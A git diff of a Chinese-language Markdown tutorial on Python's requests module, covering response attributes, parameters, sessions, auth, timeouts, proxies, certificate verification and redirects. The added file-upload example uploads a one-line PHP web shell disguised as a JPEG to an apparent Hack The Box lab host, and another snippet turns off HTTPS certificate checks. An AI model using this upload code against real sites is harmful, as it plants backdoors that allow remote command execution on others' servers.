@@ -1,7 +1,6 @@
 # requests 模块
 
 > Python 内置了 requests 模块，该模块主要用来发送 HTTP 请求，requests 模块比 urllib 模块更简洁。
->
 
 ## requests 对象响应信息方法
 
@@ -30,6 +29,7 @@
 | request               | 返回请求此响应的请求对象                                                                                                                        |
 | text                  | 返回响应的内容，unicode 类型数据                                                                                                                |
 | url                   | 返回响应的 URL                                                                                                                                  |
+| session()             | 创建一个会话对象，在多次 HTTP 请求之间自动保存 Cookie、Header、连接等信息                                                                       |
 
 ```python
 # 导入 requests 包
@@ -61,58 +61,125 @@ print(x.apparent_encoding)
 | request(method, url, args)  | 向指定 url 发送指定的请求方法 |
 
 ```python
-# args代表其他参数的意思
-# requests.post(url, data={key: value}, json={key: value}, args)
-# url 请求 url。
-# data 参数为要发送到指定 url 的字典、元组列表、字节或文件对象。
-# json 参数为要发送到指定 url 的 JSON 对象。
-# args 为其他参数，比如 cookies、headers、verify等。
+# 常用参数
+# url：请求地址
+# params：URL 参数
+# data：表单数据
+# json：JSON 数据
+# files：上传文件
+# headers：HTTP 请求头
+# cookies：Cookie
+# auth：认证
+# timeout：超时时间
+# proxies：代理
+# verify：HTTPS证书验证
+# allow_redirects：是否跟随重定向
 ```
 
-```python
-# 导入 requests 包
-import requests
-
-
-kw = {'s':'python 教程'}
-
-# 设置请求头
-headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
-
-# params 接收一个字典或者字符串的查询参数，字典类型自动转换为url编码，不需要urlencode()
-response = requests.get("https://www.runoob.com/", params = kw, headers = headers)
-
-# 查看响应状态码
-print (response.status_code)
-
-# 查看响应头部字符编码
-print (response.encoding)
-
-# 查看完整url地址
-print (response.url)
-
-# 查看响应内容，response.text 返回的是Unicode格式的数据
-print(response.text)
-```
-
-```python
-# 导入 requests 包
-import requests
-
-# 发送请求
-x = requests.request('get', 'https://www.runoob.com/')
-
-# 返回网页内容
-print(x.status_code)
-```
-
-## 显示请求和响应过程
+## session 使用
 
 ```python
 import requests
-from requests_toolbelt.utils import dump
 
-reps = requests.post(url, data=data, headers=headers)
-data = dump.dump_all(reps)
-print(data.decode('utf-8'))
+session = requests.Session()
+# 设置统一 header
+session.headers.update({
+    "User-Agent": "Mozilla/5.0"
+})
+# 设置统一代理
+session.proxies = {
+    "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080"
+}
+session.get(url)
+session.post(url)
+```
+
+## POST 上传文件
+
+```python
+import requests
+
+def main():
+    proxy = {
+        "http": "http://127.0.0.1:8080",
+        "https": "http://127.0.0.1:8080"
+    }
+    target = "http://popcorn.htb/torrent/upload_file.php"
+    web_shell = "<?php system($_GET['cmd']);?>"
+    parm = {
+        "mode": "upload",
+        "id": "520"
+    }
+    # 直接写入指定文件内容
+    files = {
+        "file": ("test.php", web_shell, "image/jpeg")
+    }
+    # 或者读取指定文件
+    files = {
+        "file": ("test.php", open('shell.php', 'rb'), "image/jpeg")
+    }
+    data = {
+        "submit": "Submit Screenshot"
+    }
+    req = requests.post(url=target, params=parm, files=files, data=data)
+    print(req.text)
+if __name__ == "__main__":
+    main()
+```
+
+## auth（认证）
+
+```bash
+import requests
+# 导入这个模块可以选择更多的认证模式
+from requests.auth import HTTPDigestAuth
+
+# 指定认证方式
+requests.get(url, auth=HTTPDigestAuth("admin","123456"))
+# 默认为 HTTP Basic 认证
+requests.get(url, auth=("admin","123456"))
+```
+
+## 超时时间
+
+```bash
+import requests
+
+# 连接超时 3s
+# 读取超时 5s
+# 解释：3秒内必须建立TCP连接，连接成功后，5秒内必须返回数据
+requests.get(url, timeout=(3,5))
+```
+
+## proxies（代理）
+
+```bash
+import requests
+
+proxies = {
+    "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080"
+}
+
+requests.get(url, proxies=proxies)
+```
+
+## verify（HTTPS 证书）
+
+```bash
+import requests
+import urllib3
+
+# 关闭 https 报错
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+requests.get(url, verify=False)
+```
+
+## allow_redirects（重定向）
+
+```bash
+import requests
+
+requests.get(url, allow_redirects=False)
 ```
